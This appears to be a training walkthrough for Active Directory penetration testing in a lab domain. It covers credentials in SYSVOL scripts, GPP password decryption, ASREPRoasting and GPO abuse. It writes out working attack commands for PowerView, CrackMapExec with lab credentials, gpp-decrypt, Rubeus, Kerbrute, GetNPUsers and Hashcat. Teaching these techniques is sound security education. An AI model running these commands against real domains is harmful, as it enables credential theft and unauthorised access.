It is possible to come across domain accounts with the `passwd_notreqd` field set in the userAccountControl attribute. If this is set, the user is not subject to the current password policy length, meaning they could have a shorter password or no password at all (if empty passwords are allowed in the domain). A password may be set as blank intentionally (sometimes admins don’t want to be called out of hours to reset user passwords) or accidentally hitting enter before entering a password when changing it via the command line. Just because this flag is set on an account, it doesn't mean that no password is set, just that one may not be required. There are many reasons why this flag may be set on a user account, one being that a vendor product set this flag on certain accounts at the time of installation and never removed the flag post-install. It is worth enumerating accounts with this flag set and testing each to see if no password is required (I have seen this a couple of times on assessments). Also, include it in the client report if the goal of the assessment is to be as comprehensive as possible.

- **Checking for PASSWD_NOTREQD Setting using Get-DomainUser**
```
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```

## Credentials in SMB Shares and SYSVOL Scripts

The `SYSVOL` share can be a treasure trove of data, especially in large organizations. We may find many different batch, VBScript, and PowerShell scripts within the scripts directory, which is readable by all authenticated users in the domain. It is worth digging around this directory to hunt for passwords stored in scripts. Sometimes we will find very old scripts containing since disabled accounts or old passwords, but from time to time, we will strike gold, so we should always dig through this directory. Here, we can see an interesting script named reset_local_admin_pass.vbs.

- **Discovering an Interesting Script**
```
ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
```
Taking a closer look at the script, we see that it contains a password for the built-in local administrator on Windows hosts. In this case, it would be worth checking to see if this password is still set on any hosts in the domain. We could do this using CrackMapExec and the` --local-auth` flag as shown in this module's Internal Password Spraying - from Linux section.
```
cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs
```

## Group Policy Preferences (GPP) Passwords

When a new GPP is created, an .xml file is created in the SYSVOL share, which is also cached locally on endpoints that the Group Policy applies to. These files can include those used to:

- Map drives (drives.xml)
- Create local users
- Create printer config files (printers.xml)
- Creating and updating services (services.xml)
- Creating scheduled tasks (scheduledtasks.xml)
- Changing local admin passwords.

These files can contain an array of configuration data and defined passwords. The **`cpassword`** attribute value is AES-256 bit encrypted, but Microsoft published the AES private key on MSDN, which can be used to decrypt the password. Any domain user can read these files as they are stored on the `SYSVOL` share, and all authenticated users in a domain, by default, have read access to this domain controller share.

This was patched in 2014 MS14-025 Vulnerability in GPP could allow elevation of privilege, to prevent administrators from setting passwords using GPP. The patch does not remove existing `Groups.xml` files with passwords from `SYSVOL`. If you delete the GPP policy instead of unlinking it from the OU, the cached copy on the local computer remains.

The XML looks like the following:

- **Viewing Groups.xml**

![image](https://github.com/user-attachments/assets/56046827-0038-4a67-92cf-09cd343b7fa5)

If you retrieve the `cpassword` value more manually, the **`gpp-decrypt`** utility can be used to decrypt the password as follows:

- **Decrypting the Password with gpp-decrypt**
```
gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
```

GPP passwords can be located by searching or **manually** browsing the **`SYSVOL`** share or using tools such as **`Get-GPPPassword.ps1`**, the **GPP Metasploit Post Module**, and other **Python/Ruby scripts** which will locate the GPP and return the decrypted cpassword value. **CrackMapExec** also has two modules for locating and retrieving GPP passwords. One quick tip to consider during engagements: Often, GPP passwords are defined for legacy accounts, and you may therefore retrieve and decrypt the password for a locked or deleted account. However, it is worth attempting to password spray internally with this password (especially if it is unique). Password re-use is widespread, and the GPP password combined with password spraying could result in further access.

- **Locating & Retrieving GPP Passwords with CrackMapExec**
```
crackmapexec smb -L | grep gpp
```

It is also possible to find passwords in files such as `Registry.xml` when `autologon` is configured via Group Policy. This may be set up for any number of reasons for a machine to automatically log in at boot. If this is set via Group Policy and not locally on the host, then anyone on the domain can retrieve credentials stored in the Registry.xml file created for this purpose. This is a separate issue from GPP passwords as Microsoft has not taken any action to block storing these credentials on the SYSVOL in cleartext and, hence, are readable by any authenticated user in the domain. We can hunt for this using CrackMapExec with the **`gpp_autologin`** module, or using the **`Get-GPPAutologon.ps1`** script included in PowerSploit.

- **Using CrackMapExec's gpp_autologin Module**
```
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
```

## ASREPRoasting

It's possible to obtain the Ticket Granting Ticket (TGT) for any account that has the **Do not require Kerberos pre-authentication** setting enabled. Many vendor installation guides specify that their service account be configured in this way. The authentication service reply (AS_REP) is encrypted with the account’s password, and any domain user can request it.

With pre-authentication, a user enters their password, which encrypts a time stamp. The Domain Controller will decrypt this to validate that the correct password was used. If successful, a TGT will be issued to the user for further authentication requests in the domain. If an account has pre-authentication disabled, an attacker can request authentication data for the affected account and retrieve an encrypted TGT from the Domain Controller. This can be subjected to an offline password attack using a tool such as Hashcat or John the Ripper.

Reference: https://www.tenable.com/blog/how-to-stop-the-kerberos-pre-authentication-attack-in-active-directory

- Viewing an Account with the Do not Require Kerberos Preauthentication Option
![image](https://github.com/user-attachments/assets/3eae4afe-e187-423f-9902-dab32743dcad)

ASREPRoasting is similar to Kerberoasting, but it involves attacking the AS-REP instead of the TGS-REP. An **SPN is not required**. This setting can be enumerated with `PowerView` or built-in tools such as the PowerShell AD module.

The attack itself can be performed with the `Rubeus` toolkit and other tools to obtain the ticket for the target account. If an attacker has `GenericWrite` or `GenericAll` permissions over an account, they can enable this attribute and obtain the AS-REP ticket for offline cracking to recover the account's password before disabling the attribute again. Like Kerberoasting, the success of this attack depends on the account having a relatively weak password.

Below is an example of the attack. PowerView can be used to enumerate users with their UAC value set to `DONT_REQ_PREAUTH`.

- **Enumerating for DONT_REQ_PREAUTH Value using Get-DomainUser**
```
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
```

With this information in hand, the `Rubeus` tool can be leveraged to retrieve the AS-REP in the proper format for offline hash cracking. This attack does not require any domain user context and can be done by just knowing the SAM name for the user without Kerberos pre-auth. We will see an example of this using Kerbrute later in this section. Remember, add the `/nowrap` flag so the ticket is not column wrapped and is retrieved in a format that we can readily feed into Hashcat.

- **Retrieving AS-REP in Proper Format using Rubeus**
```
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
```
We can then crack the hash offline using Hashcat with mode 18200.

- **Cracking the Hash Offline with Hashcat**
```
hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt
```

> **When performing user enumeration with `Kerbrute`, the tool will automatically retrieve the AS-REP for any users found that do not require Kerberos pre-authentication.**


- **Retrieving the AS-REP Using Kerbrute**
```
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```

With a list of valid users, we can use **`Get-NPUsers.py`** from the Impacket toolkit to hunt for all users with Kerberos pre-authentication not required. The tool will retrieve the AS-REP in Hashcat format for offline cracking for any found. We can also feed a wordlist such as jsmith.txt into the tool, it will throw errors for users that do not exist, but if it finds any valid ones without Kerberos pre-authentication, then it can be a nice way to obtain a foothold or further our access, depending on where we are in the course of our assessment. Even if we are unable to crack the AS-REP using Hashcat it is still good to report this as a finding to clients (just lower risk if we cannot crack the password) so they can assess whether or not the account requires this setting.

- **Hunting for Users with Kerberoast Pre-auth Not Required**
```
GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users
```

## Group Policy Object (GPO) Abuse

Group Policy provides administrators with many advanced settings that can be applied to both user and computer objects in an AD environment. Group Policy, when used right, is an excellent tool for hardening an AD environment by configuring user settings, operating systems, and applications. That being said, Group Policy can also be abused by attackers. If we can gain rights over a Group Policy Object via an ACL misconfiguration, we could leverage this for lateral movement, privilege escalation, and even domain compromise and as a persistence mechanism within the domain. Understanding how to enumerate and attack GPOs can give us a leg up and can sometimes be the ticket to achieving our goal in a rather locked-down environment.

GPO misconfigurations can be abused to perform the following attacks:
- Adding additional rights to a user (such as SeDebugPrivilege, SeTakeOwnershipPrivilege, or SeImpersonatePrivilege)
- Adding a local admin user to one or more hosts
- Creating an immediate scheduled task to perform any number of actions

We can enumerate GPO information using many of the tools we've been using throughout this module such as `PowerView` and `BloodHound`. We can also use `group3r`, `ADRecon`, `PingCastle`, among others, to audit the security of GPOs in a domain.

Using the `Get-DomainGPO` function from PowerView, we can get a listing of GPOs by name.

Reference: https://github.com/Group3r/Group3r

Reference: https://github.com/sense-of-security/ADRecon

Reference: https://www.pingcastle.com/

- **Enumerating GPO Names with PowerView**
```
Get-DomainGPO |select displayname
```

This can be helpful for us to begin to see what types of security measures are in place (such as denying cmd.exe access and a separate password policy for service accounts). We can see that autologon is in use which may mean there is a readable password in a GPO, and see that Active Directory Certificate Services (AD CS) is present in the domain. If Group Policy Management Tools are installed on the host we are working from, we can use various built-in `GroupPolicy` cmdlets such as `Get-GPO` to perform the same enumeration.

- **Enumerating GPO Names with a Built-In Cmdlet**
```
Get-GPO -All | Select DisplayName
```

Next, we can check if a user we can control has any rights over a GPO. Specific users or groups may be granted rights to administer one or more GPOs. A good first check is to see if the entire Domain Users group has any rights over one or more GPOs.

- **Enumerating Domain User GPO Rights**
```
$sid=Convert-NameToSid "Domain Users"
Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
```

Here we can see that the Domain Users group has various permissions over a GPO, such as WriteProperty and WriteDacl, which we could leverage to give ourselves full control over the GPO and pull off any number of attacks that would be pushed down to any users and computers in OUs that the GPO is applied to. We can use the GPO GUID combined with Get-GPO to see the display name of the GPO.

- **Converting GPO GUID to Name**
```
Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
```

Checking in `BloodHound`, we can see that the `Domain Users` group has several rights over the `Disconnect Idle RDP` GPO, which could be leveraged for full control of the object.

![image](https://github.com/user-attachments/assets/3bc497fd-0861-468f-b29f-9c4bc78fb0fa)

If we select the GPO in BloodHound and scroll down to `Affected Objects` on the `Node Info` tab, we can see that this GPO is applied to one OU, which contains four computer objects.

![image](https://github.com/user-attachments/assets/897918ed-e7c2-44a7-99fa-29aab8fd585c)

We could use a tool such as **`SharpGPOAbuse`** to take advantage of this GPO misconfiguration by performing actions such as adding a user that we control to the local admins group on one of the affected hosts, creating an immediate scheduled task on one of the hosts to give us a reverse shell, or configure a malicious computer startup script to provide us with a reverse shell or similar. When using a tool like this, we need to be careful because commands can be run that affect every computer within the OU that the GPO is linked to. If we found an editable GPO that applies to an OU with 1,000 computers, we would not want to make the mistake of adding ourselves as a local admin to that many hosts. Some of the attack options available with this tool allow us to specify a target user or host. The hosts shown in the above image are not exploitable, and GPO attacks will be covered in-depth in a later module.

Reference: https://github.com/FSecureLABS/SharpGPOAbuse

We have seen various misconfigurations that we may run into during an assessment, and there are many more that will be covered in more advanced Active Directory modules. It is worth familiarizing ourselves with as many attacks as possible, so we recommend doing some research on topics such as:

- _Active Directory Certificate Services (AD CS) attacks_
- _Kerberos Constrained Delegation_
- _Kerberos Unconstrained Delegation_
- _Kerberos Resource-Based Constrained Delegation (RBCD)_
